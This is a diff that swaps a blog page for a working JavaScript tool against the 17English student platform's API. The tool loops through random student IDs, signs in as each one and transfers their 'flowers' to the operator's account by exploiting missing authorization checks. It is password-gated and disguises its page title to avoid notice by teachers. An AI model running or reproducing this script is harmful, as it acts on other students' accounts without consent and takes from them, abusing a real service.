@@ -1,591 +1,163 @@
-
-
-<!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
-
-
-
+<html>
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
-  <link rel="icon" href="/img/favicon.jpg">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="ret2libc-pwned">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="点击进入">
-<meta property="og:type" content="website">
-<meta property="og:title" content="page.title">
-<meta property="og:url" content="https://ret2libc-pwned.github.io/17eng/index.html">
-<meta property="og:site_name" content="OI-Cheatsheet">
-<meta property="og:description" content="点击进入">
-<meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-03-27T14:26:25.499Z">
-<meta property="article:modified_time" content="2023-03-27T14:26:25.499Z">
-<meta property="article:author" content="ret2libc-pwned">
-<meta name="twitter:card" content="summary_large_image">
-  
-  
-  <title>page.title - OI-Cheatsheet</title>
-
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
-
-
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
-
-  
-    
-    
-      
-      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/atom-one-dark.min.css" />
-    
-  
-
-  
-    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
-  
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-<!-- 自定义样式保持在最底部 -->
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"ret2libc-pwned.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.2">
-<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="alternate" href="/atom.xml" title="OI-Cheatsheet" type="application/atom+xml">
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.5.1/jquery.js"></script>
+<script>
+	const flowerAPI = `https://studentapi.lyced.com/student/SendFlower`;
+	const lsAPI = `https://studentapi.lyced.com//student/GetClassFlowerListByStudent`;
+	const signInAPI = `https://studentapi.lyced.com//student/Sign`;
+	let myId, l, n;
 
+	const _request_fail = {
+		Code: 0000,
+		Message: "请求失败"
+	};
 
-<body><!-- hexo injector body_begin start -->
-  <script type="text/javascript">
-  function clickEffect() {
-    let balls = [];
-    let longPressed = false;
-    let longPress;
-    let multiplier = 0;
-    let width, height;
-    let origin;
-    let normal;
-    let ctx;
-    const colours = ["#F73859", "#14FFEC", "#00E0FF", "#FF99FE", "#FAF15D"];
-    const canvas = document.createElement("canvas");
-    document.body.appendChild(canvas);
-    canvas.setAttribute("style", "width: 100%; height: 100%; top: 0; left: 0; z-index: 99999; position: fixed; pointer-events: none;");
-    const pointer = document.createElement("span");
-    pointer.classList.add("pointer");
-    document.body.appendChild(pointer);
-
-    if (canvas.getContext && window.addEventListener) {
-      ctx = canvas.getContext("2d");
-      updateSize();
-      window.addEventListener('resize', updateSize, false);
-      loop();
-      window.addEventListener("mousedown", function(e) {
-        pushBalls(randBetween(10, 20), e.clientX, e.clientY);
-        document.body.classList.add("is-pressed");
-        longPress = setTimeout(function() {
-          document.body.classList.add("is-longpress");
-          longPressed = true;
-        }, 500);
-      }, false);
-      window.addEventListener("mouseup", function(e) {
-        clearInterval(longPress);
-        if (longPressed == true) {
-          document.body.classList.remove("is-longpress");
-          pushBalls(randBetween(50 + Math.ceil(multiplier), 100 + Math.ceil(multiplier)), e.clientX, e.clientY);
-          longPressed = false;
-        }
-        document.body.classList.remove("is-pressed");
-      }, false);
-      window.addEventListener("mousemove", function(e) {
-        let x = e.clientX;
-        let y = e.clientY;
-        pointer.style.top = y + "px";
-        pointer.style.left = x + "px";
-      }, false);
-    } else {
-      console.log("canvas or addEventListener is unsupported!");
+	function Sleep(time) {
+        const start = new Date().getTime();
+        while (new Date().getTime() - start < time) {}
     }
 
-
-    function updateSize() {
-      canvas.width = window.innerWidth * 2;
-      canvas.height = window.innerHeight * 2;
-      canvas.style.width = window.innerWidth + 'px';
-      canvas.style.height = window.innerHeight + 'px';
-      ctx.scale(2, 2);
-      width = (canvas.width = window.innerWidth);
-      height = (canvas.height = window.innerHeight);
-      origin = {
-        x: width / 2,
-        y: height / 2
-      };
-      normal = {
-        x: width / 2,
-        y: height / 2
-      };
-    }
-    class Ball {
-      constructor(x = origin.x, y = origin.y) {
-        this.x = x;
-        this.y = y;
-        this.angle = Math.PI * 2 * Math.random();
-        if (longPressed == true) {
-          this.multiplier = randBetween(14 + multiplier, 15 + multiplier);
-        } else {
-          this.multiplier = randBetween(6, 12);
-        }
-        this.vx = (this.multiplier + Math.random() * 0.5) * Math.cos(this.angle);
-        this.vy = (this.multiplier + Math.random() * 0.5) * Math.sin(this.angle);
-        this.r = randBetween(8, 12) + 3 * Math.random();
-        this.color = colours[Math.floor(Math.random() * colours.length)];
-      }
-      update() {
-        this.x += this.vx - normal.x;
-        this.y += this.vy - normal.y;
-        normal.x = -2 / window.innerWidth * Math.sin(this.angle);
-        normal.y = -2 / window.innerHeight * Math.cos(this.angle);
-        this.r -= 0.3;
-        this.vx *= 0.9;
-        this.vy *= 0.9;
-      }
-    }
-
-    function pushBalls(count = 1, x = origin.x, y = origin.y) {
-      for (let i = 0; i < count; i++) {
-        balls.push(new Ball(x, y));
-      }
-    }
-
-    function randBetween(min, max) {
-      return Math.floor(Math.random() * max) + min;
-    }
-
-    function loop() {
-      ctx.fillStyle = "rgba(255, 255, 255, 0)";
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      for (let i = 0; i < balls.length; i++) {
-        let b = balls[i];
-        if (b.r < 0) continue;
-        ctx.fillStyle = b.color;
-        ctx.beginPath();
-        ctx.arc(b.x, b.y, b.r, 0, Math.PI * 2, false);
-        ctx.fill();
-        b.update();
-      }
-      if (longPressed == true) {
-        multiplier += 0.2;
-      } else if (!longPressed && multiplier >= 0) {
-        multiplier -= 0.4;
-      }
-      removeBall();
-      requestAnimationFrame(loop);
-    }
-
-    function removeBall() {
-      for (let i = 0; i < balls.length; i++) {
-        let b = balls[i];
-        if (b.x + b.r < 0 || b.x - b.r > width || b.y + b.r < 0 || b.y - b.r > height || b.r < 0) {
-          balls.splice(i, 1);
-        }
-      }
-    }
-  }
-  clickEffect();
-  </script>
-  <!-- hexo injector body_begin end -->
-  <header style="height: 60vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>OI-Cheatsheet</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                友链
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/txedu-helper/">
-                <i class="iconfont icon-book"></i>
-                网课神器
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-    <div class="banner" id="banner" parallax=true
-         style="background: url('/img/default.jpg') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="page.title">
-              
-            </span>
-
-            
-          </div>
-
-          
-        </div>
-      </div>
-    </div>
-  </header>
-
-  <main>
-    
-      <div class="container nopadding-x-md">
-        <div class="py-5" id="board"
-          >
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
-                
-
-<article class="page-content">
-  <h1 id="点击进入"><a href="./flower.html">点击进入</a></h1>
-
-
-  
-</article>
-
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-    
-
-    
-  </main>
-
-  <footer class="text-center mt-5 py-3">
-  <div class="footer-content">
-     <span>ret2libc-pwned</span> <i class="iconfont icon-love"></i> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a><span> + </span><a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-  </div>
-  
-  <div class="statistics">
-    
-    
-
-    
-      
-        <!-- 不蒜子统计PV -->
-        <span id="busuanzi_container_site_pv" style="display: none">
-            总访问量 
-            <span id="busuanzi_value_site_pv"></span>
-             次
-          </span>
-      
-      
-        <!-- 不蒜子统计UV -->
-        <span id="busuanzi_container_site_uv" style="display: none">
-            总访客数 
-            <span id="busuanzi_value_site_uv"></span>
-             人
-          </span>
-      
-    
-  </div>
-
-
-  
-
-  
-</footer>
-
-
-  <!-- SCRIPTS -->
-  
-  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
-<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-<!-- Plugins -->
-
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-  
-
-
-
-  
-    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
-  
-  
-    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
-  
-  
-    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
-  
-  
-    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
-  
-
-
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var title = document.getElementById('subtitle').title;
-      
-        typing(title);
-      
-    })(window, document);
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<!-- 主题的启动项 保持在最底部 -->
-<script  src="/js/boot.js" ></script>
-
-
-<!-- hexo injector body_end start -->
-  <div id="aplayer"></div>
-  <link defer rel="stylesheet" href="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.css" />
-  <script src="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.js"></script>
-  <!-- <script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script> -->
-  <!-- <meting-js server="netease" type="playlist" id="8435661"></meting-js> -->
-  <script defer>
-    !(function() {
-    var oldLoadAp = window.onload;
-    window.onload = function () {
-      oldLoadAp && oldLoadAp();
-
-      new APlayer({
-        container: document.getElementById('aplayer'),
-        fixed: true,
-        autoplay: false,
-        loop: 'all',
-        order: 'random',
-        theme: '#b7daff',
-        preload: 'none',
-        audio: [
-          {
-            name: 'Refrain',
-            artist: '阿南亮子',
-            cover: 'http://p2.music.126.net/L9-d4kf-D27DkJ_0Uw6rAA==/109951166455944113.jpg?param=130y130',
-            url: 'http://music.163.com/song/media/outer/url?id=22712173.mp3'
-          }, 
-          {
-            name: '故郷の原風景',
-            artist: '宗次郎',
-            cover: 'http://p1.music.126.net/ygxAeYxxXPONww041tylMw==/5996736418028563.jpg',
-            url: 'http://p1.music.126.net/ygxAeYxxXPONww041tylMw==/5996736418028563.jpg'
-          },
-          {
-            name: '風の住む街 (风居住的街道)',
-            artist: '磯村由紀子',
-            cover: 'https://p1.music.126.net/ap7KvRE0-V4kfThDVVor9A==/18777459579736085.jpg?param=130y130',
-            url: 'http://music.163.com/song/media/outer/url?id=586299.mp3'
-          },
-          {
-            name: 'Tassel',
-            artist: 'Cymophane',
-            cover: 'http://p1.music.126.net/7cYhniBuLvU3fvLjeRFeNw==/106652627910735.jpg?param=130y130',
-            url: 'http://music.163.com/song/media/outer/url?id=357126.mp3'
-          },
-          {
-            name: 'My Soul',
-            artist: 'July',
-            cover: 'http://p1.music.126.net/NFl1s5Hl3E37dCaFIDHfNw==/727876697598920.jpg?param=130y130',
-            url: 'http://music.163.com/song/media/outer/url?id=5308028.mp3'
-          }
-        ]
-      });
-    }
-  })();
-  </script>
-<!-- hexo injector body_end end --></body>
+	function writeln(s, t = "p") {
+		document.writeln(`<${t}>${s}</${t}>`);
+	}
+
+	function parseList(user) {
+		let ret = _request_fail;
+		$.ajax({
+		    type: "GET",
+		    url: lsAPI,
+			data: {StudentId: user},
+		    dataType: "json",
+		    async: false,
+		    success: function(dat){
+		        // console.log("[parseList]", JSON.stringify(dat.Data.StudentFlowers));
+		        ret = dat.Data.StudentFlowers;
+		    }
+		});
+		return ret;
+	}
+
+	function transFlower(src, dest, cnt = 1) {
+		let ret = _request_fail;
+		$.ajax({
+		    type: "GET",
+		    url: flowerAPI,
+			data: {Sender: src, Receiver: dest, FlowerCount: cnt},
+		    dataType: "json",
+		    async: false,
+		    success: function(dat){
+		        ret = dat;
+		    }
+		});
+		return ret;
+	}
+
+	function signIn(user) {
+		let ret = _request_fail;
+		$.ajax({
+		    type: "GET",
+		    url: signInAPI,
+			data: {StudentId: user},
+		    dataType: "json",
+		    async: false,
+		    success: function(dat){
+		        ret = dat;
+		    }
+		});
+		return ret;
+	}
+
+	function monitor(n, t = 1000) {
+		let k = 0;
+		console.log()
+		let _auto_refresh = setInterval(() => {
+			if(k > n) clearInterval(_auto_refresh);
+			flowerLs = parseList(myId);
+			flowerLs.forEach((x) => {
+			    if(x.StudentId == myId) {
+			        console.log(`您的鲜花数量 --> ${x.FlowerCount}`);
+			    }
+			});
+			++k;
+		}, t);
+	}
+
+	function linerFunc() {
+		// 一个神奇的一次函数 y = x + b
+		document.getElementById("input_id").value = parseInt(document.getElementById("input_id").value) + 1003719;
+	}
+
+	function login() {
+		// 获取输入
+		myId = document.getElementById("input_id").value;
+		// l = document.getElementById("input_l").value;
+		// n = document.getElementById("input_n").value;
+		let flowerLs = parseList(myId);
+		// 生成前端
+		writeln("17English 鲜花超级大盗 - 内部版本", "h2");
+		writeln("任务信息", "h3");
+		writeln("要想返回到起始页修改相关信息，刷新即可。");
+		writeln(`你的 ID 为：${myId}`);
+		writeln("班级鲜花排行榜", "h3");
+		writeln(JSON.stringify(flowerLs));
+		writeln("\n打开控制台查看脚本输出", "b");
+		writeln("", "br");
+		let $startBtn = document.createElement("button"), $backBtn = document.createElement("button");
+		$startBtn.innerHTML = "创建新线程";
+		$backBtn.innerHTML = "返回上一页";
+		document.body.appendChild($startBtn), document.body.appendChild($backBtn);
+		$startBtn.setAttribute("onclick", "start()");
+		$backBtn.setAttribute("onclick", "location.reload()");
+		
+	}
+
+	function start() {
+		let i = 0;
+		let l = Math.max(1e6, Math.min(1e7, Math.floor(Math.random() * 1e7)));
+		const n = 50000;
+		let _main = setInterval(() => {
+		    if(i >= 9999) clearInterval(_main);
+		    console.log(`正在光临用户 ${l + i}...`);
+		    console.log("1. 尝试签到：", signIn(l + i));
+		    console.log("2. 偷花");
+		    for(let res = transFlower(l + i, myId, 1), j = 1; res.Code == '0000'; ++i, ++j) {
+		        try {
+		        	res = transFlower(l + i, myId, 1);
+		        	if(res.Code != '0000' && res.Code != '9999') throw `returned error code ${res.Code}`;
+		        	console.log(`偷了 ${j} 朵花了！`);
+		    		console.log("-------------------------------------");
+		        } catch(e) {
+		        	Sleep(1000);
+		        	console.error("错误！", e.toString());
+		        }
+		    }
+		}, 1000);
+	}
+
+	for(let _passwd = prompt("Password required"); _passwd != "114514"; _passwd = prompt("Retry!!"));
+
+	// 开始页面
+	writeln("17English 鲜花超级大盗 - 内部版本", "h2");
+	writeln("功能介绍", "h3");
+	writeln("该网页通过 17English 的 API 实现帮用户签到、偷取别的用户鲜花的功能。");
+	writeln("开始使用", "h3");
+	writeln("请填写下面的表单，若要查询鲜花数量请只填写“您的 ID”");
+	writeln("Release Note", "h3");
+	writeln("内部版本，请勿外传！严禁在学校使用！技术无罪，本脚本仅用作交流学习使用。如发生 IP 被封、账号功能被禁用等事故作者不承担一切责任！");
+	writeln("修复页面卡顿的问题，并支持异步");
+	writeln("本网页不会储存、记录您的账号信息，请放心使用！","b");
+	writeln(`${["如何制作老师恶搞表情包", "如何玩学校电脑不被班主任发现", "班主任整天查历史记录烦死了怎么办", "玩电脑被老师发现检讨800字"][Math.floor(Math.random() * 100) % 4]} - 百度经验`, "title"); 	// 该版本禁止外传，禁止在学校使用，后果自负！！！
+</script>
+
+<br>
+<br>
+您的 ID：<input id="input_id" value="1194148"></input><br>
+<!-- 开始 ID：<input id="input_l" value="1194119"></input><br> -->
+<!-- 尝试用户数：<input id="input_n" value="100000"></input><br> -->
+<button onclick="linerFunc()">神奇的一次函数</button>
+<button onclick="login()">确定</button>
+<br>
 </html>
